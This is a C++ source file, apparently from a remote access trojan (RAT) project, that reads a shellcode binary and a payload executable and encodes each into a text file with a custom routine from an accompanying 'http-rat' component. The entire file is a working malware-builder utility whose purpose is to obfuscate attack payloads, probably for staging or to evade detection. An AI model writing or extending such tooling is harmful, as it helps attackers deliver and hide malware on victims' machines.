// encode-rat.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <fstream>

#include "../http-rat/xvary.hpp"

std::string read_file(std::string filename)
{
	std::string ret;
	char* buffer = nullptr;
	std::fstream file;

	do
	{
		file.open(filename.c_str(), std::ios::in | std::ios::binary);
		if (!file)
		{
			break;
		}

		// set flag for filesize
		file.seekg(0, file.end);
		int size = static_cast<int>(file.tellg());
		if (size <= 0)
		{
			break;
		}

		// reset flag to file begin
		file.seekg(0, std::ios::beg);

		buffer = new char[size] {0};
		if (!buffer)
		{
			break;
		}

		file.read(buffer, size);

		ret.append(buffer, size);
	} while (false);

	if (buffer)
	{
		delete[]buffer;
		buffer = nullptr;
	}

	if (file)
	{
		file.close();
	}

	return ret;
}

bool write_file(std::string filename, std::string content)
{
	std::fstream file(filename.c_str(), std::ios::out);
	if (!file)
	{
		return false;
	}

	file << content;
	file.close();

	return true;
}

/// <summary>
/// xcrypt!!!
/// </summary>
/// <param name="oldfile"></param>
/// <param name="newfile"></param>
/// <returns></returns>
bool encode_save(std::string oldfile, std::string newfile)
{
	std::string buffer = read_file(oldfile);
	if (buffer.empty() || buffer.size() <= 0)
	{
		return false;
	}

	//
	// 加密算法部分!!!
	//

	std::string content = xvary::encode(buffer);
	if (content.empty())
	{
		return false;
	}

	//
	// 
	// encode finish
	if (!write_file(newfile, content))
	{
		return false;
	}

	return true;
}

int main()
{
	bool ret = false;

	ret = encode_save("shellcode.bin", "shellcode.bin.txt");
	if (!ret)
	{
		return EXIT_FAILURE;
	}

	ret = encode_save("payload.exe", "payload.exe.txt");
	if (!ret)
	{
		return EXIT_FAILURE;
	}

	std::cout << "encode success" << std::endl;
	system("pause");
	return EXIT_SUCCESS;
}